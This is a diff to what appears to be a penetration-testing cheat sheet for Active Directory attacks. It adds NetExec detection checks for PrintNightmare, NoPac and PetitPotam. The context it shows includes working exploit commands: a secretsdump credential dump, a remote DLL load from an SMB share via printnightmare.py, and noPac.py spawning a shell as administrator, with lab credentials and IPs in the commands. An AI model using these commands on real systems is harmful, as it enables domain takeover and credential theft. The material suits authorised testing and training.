@@ -322,6 +322,10 @@ impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pa
 ```
 ### Domain Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
 ```
+Detect:
+nxc smb ip -u username -p pass -M printnightmare
+```
+```
 impacket-smbserver test . -smb2support
 
 #include <stdlib.h>
@@ -357,9 +361,17 @@ python3 printnightmare.py -dll '\\10.21.176.25\test\adduser.dll' 'svc-admin:mana
 ```
 ### Domain Priviledge Escalation By NoPac CVE-2021-42278 & CVE-2021-42287
 ```
+Detect:
+nxc smb ip -u username -p pass -M nopac
+
 git clone https://github.com/Ridter/noPac.git
 sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
 sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
+### Domain Privilege Escalation By Petitpotam CVE-2021-36942
+```
+Detect:
+nxc smb ip -u username -p pass -M petitpotam
 ```
 ### Shadow Credential Attack
 ```
